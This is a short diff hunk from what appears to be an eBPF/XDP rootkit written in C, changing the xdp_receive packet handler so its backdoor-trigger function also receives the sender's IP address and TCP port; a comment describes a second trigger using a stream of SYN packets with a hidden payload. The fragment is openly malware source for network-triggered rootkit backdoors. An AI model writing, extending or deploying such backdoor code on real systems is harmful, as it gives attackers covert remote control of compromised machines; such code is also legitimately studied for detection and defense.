@@ -104,7 +104,7 @@ int xdp_receive(struct xdp_md *ctx){
             bpf_printk("G");
             return XDP_PASS;
         }
-        return manage_backdoor_trigger_v1(payload, payload_size);
+        return manage_backdoor_trigger_v1(payload, payload_size, ip->saddr, tcp->source);
     }
     //Check for rootkit backdoor trigger V3 - stream of SYN packets with hidden payload
     if(tcp->syn == 1){
